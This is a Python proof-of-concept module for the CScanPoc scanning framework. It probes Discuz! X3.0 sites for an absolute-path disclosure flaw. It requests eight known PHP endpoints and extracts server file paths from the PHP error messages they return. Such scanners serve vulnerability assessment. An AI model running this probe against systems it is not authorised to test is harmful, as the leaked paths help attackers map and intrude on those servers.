# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Discuz_0002'  # 平台漏洞编号，留空
    name = 'Discuz! X3.0 绝对路径泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-06-25'  # 漏洞公布时间
    desc = '''
        discuz X3.0 存在多处绝对路径泄露。
    '''  # 漏洞描述
    ref = 'http://www.360doc.com/content/13/0616/13/11029609_293244305.shtml'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'x3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0232304a-dae4-4072-9859-b6975ab3ceb9'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payloads = [
                '/api/addons/zendcheck.php',
                '/api/addons/zendcheck52.php',
                '/api/addons/zendcheck53.php',
                '/source/plugin/mobile/api/1/index.php',
                '/source/plugin/mobile/extends/module/dz_digest.php',
                '/source/plugin/mobile/extends/module/dz_newpic.php',
                '/source/plugin/mobile/extends/module/dz_newreply.php',
                '/source/plugin/mobile/extends/module/dz_newthread.php',
            ]

            pathinfo = re.compile(r' in <b>(.*)</b> on line')
            for payload in payloads:
                verify_url = self.target + payload
                req = requests.get(verify_url)
                match = pathinfo.findall(req.text)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
